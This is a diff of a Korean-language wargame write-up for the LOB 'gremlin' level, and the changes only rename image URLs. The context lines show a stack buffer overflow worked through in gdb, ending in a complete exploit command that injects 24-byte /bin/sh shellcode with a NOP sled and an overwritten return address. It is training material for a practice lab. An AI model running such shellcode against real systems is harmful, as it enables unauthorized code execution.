@@ -47,7 +47,7 @@ argv[1]의 값을 buffer배열로 복사할때 복사되는 크기가 정해져�
 
 ### 0x02. Dynamic Analysis
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827153846747.png" width="400px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/01.png" width="400px">{:.rounded.shadow}
 
 
 
@@ -66,14 +66,14 @@ LOB에서 제공되는 바이너리에서는 gdb로 실행 불가능하므로,
 <br>
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827160952522.png" width="400px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/02.png" width="400px">{:.rounded.shadow}
 
 ebp-256의 주소는 **0xbffffb88**인 것으로 확인되었다.  
 그리고 실제 strcpy함수가 실행되고 나서 해당 주소에 "AAAABBBBCCCC"가 들어가는지 확인해보자.
 
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827155432259.png" width="500px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/03.png" width="500px">{:.rounded.shadow}
 
 정상적으로 값이 들어가는 것을 확인하였다.
 
@@ -83,7 +83,7 @@ ebp-256의 주소는 **0xbffffb88**인 것으로 확인되었다.
 
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827161306733.png" width="400px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/04.png" width="400px">{:.rounded.shadow}
 
 `ulimit -a` 명령어로 core 생성 사이즈가 설정되어 있는지 확인하자. 만약 0으로 설정되어 있다면 `ulimit -c unlimited` 명령을 주어 설정하자.
 
@@ -96,7 +96,7 @@ ret주소를 "CCCC"로 덮어 core덤프가 생성되도록 해보자.
 
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827161634020.png" width="800px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/05.png" width="800px">{:.rounded.shadow}
 
 아래는 buffer배열을 "A"로 채우고, SFP에는 "B"를 RET주소에는 "C"를 채우는 payload이다. 
 
@@ -110,15 +110,15 @@ $ ./aremlin `python -c 'print "A"*256+"BBBB"+"CCCC"'`
 $ gdb -q -c core
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827161824108.png" width="700px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/06.png" width="700px">{:.rounded.shadow}
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162010840.png" width="400px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/07.png" width="400px">{:.rounded.shadow}
 
 예상한대로 ebp가 "BBBB"로 채워졌으며, EIP가 "CCCC"로 채워졌음을 확인 할 수 있다.
 
 <br>
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162123236.png" width="500px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/08.png" width="500px">{:.rounded.shadow}
 
 프로그램이 종료된 스택 상태를 살펴보면 "A"라는 문자열이 0xbffffcf0 언저리에서 부터 들어간 것을 확인 할 수 있다.  
 **우리가 buffer배열의 주소로 구한 0xbffffb88과는 확연히 다른 주소이다.**  
@@ -138,7 +138,7 @@ $ gdb -q -c core
    
 메모리 상태를 예상해보면 아래와 같다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827160200021.png" width="500px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/09.png" width="500px">{:.rounded.shadow}
 
 buffer부분에 shellcode를 올려놓고 ret주소에 buffer주소를 넣으면 함수가 종료되면서 ret주소를 참조하여 해당 주소를 실행할 때, shellcode가 실행되게 된다.
 
@@ -160,7 +160,7 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 $ ./gremlin `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*(260-100-24)+"\xf0\xfc\xff\xbf"'`
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/image-20180827162535728.png" width="800px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/01.gremlin/10.png" width="800px">{:.rounded.shadow}
 
 -----
 
